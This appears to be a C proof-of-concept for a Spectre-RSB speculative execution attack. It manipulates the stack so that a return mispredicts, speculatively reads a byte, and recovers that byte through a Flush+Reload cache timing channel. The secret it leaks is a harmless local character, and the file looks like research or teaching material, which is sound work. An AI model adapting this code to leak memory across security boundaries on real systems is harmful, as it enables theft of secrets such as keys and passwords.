#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

// inaccessible secret

#define CACHE_MISS 80

int junk;
char *probe_buf;
char secret = 'S';
int pagesize = 4096;

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void __attribute__((__always_inline__)) maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }


int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  _mm_mfence();
  //flush(ptr);
  _mm_clflush(ptr);

  return (int)(end - start);
}

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
    register uintptr_t sp asm ("sp");
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  flush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak() {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  maccess(probe_buf + secret*pagesize);
  _mm_mfence();
  return 2;
}

int __attribute__ ((noinline)) call_start() {
  call_leak();
  _mm_mfence();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  call_start();
  call_leak();
  call_manipulate_stack();
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  int mix_i;

  probe_buf = malloc(256 * pagesize);
  memset(probe_buf,0,256*pagesize);

    
  
  for (int p =0; p < 8; p++) { // ! introducing for loop changes where a hit is measured
    // for every byte in the string
    for (int j = 0; j < 256; j++){
        _mm_clflush(probe_buf + j*pagesize);
    }
    _mm_mfence();
    
    
    //maccess(probe_buf + 'S' * pagesize);
    call_start();
    _mm_mfence();

    // Recover data from covert channel
    
    for (int i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        if (flush_reload_t(probe_buf + mix_i * pagesize) <= CACHE_MISS){
            printf("hit at %d\n",mix_i);
        }
    }

    _mm_mfence();
  }
  //printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
  free(probe_buf);

  return (0);
}
